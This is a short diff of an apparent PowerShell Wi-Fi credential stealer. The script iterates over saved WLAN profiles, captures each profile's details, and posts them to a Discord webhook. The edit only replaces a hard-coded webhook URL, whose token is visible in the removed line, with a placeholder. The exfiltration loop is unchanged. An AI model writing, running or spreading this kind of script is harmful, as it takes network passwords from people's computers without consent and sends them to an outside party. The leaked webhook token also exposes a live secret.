@@ -13,7 +13,7 @@ foreach ($profile in $profiles) {
 
     # Run the command to get the profile details and send them to Discord
     $profileOutput = & $showProfileCommand
-    $webhookUrl = "https://discord.com/api/webhooks/1076457758339113011/P3IfFUZ1fPc0hol-XyLStktJlgQQZ-UPY_c1hcOm_IDcBLufahYvTkg51wbQ9XEEBJFO"
+    $webhookUrl = "WEBHOOK URL"
     $postData = @{ content = "WLAN Profile: $profile`n`n$profileOutput" } | ConvertTo-Json
     Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $postData -ContentType 'application/json'
 }
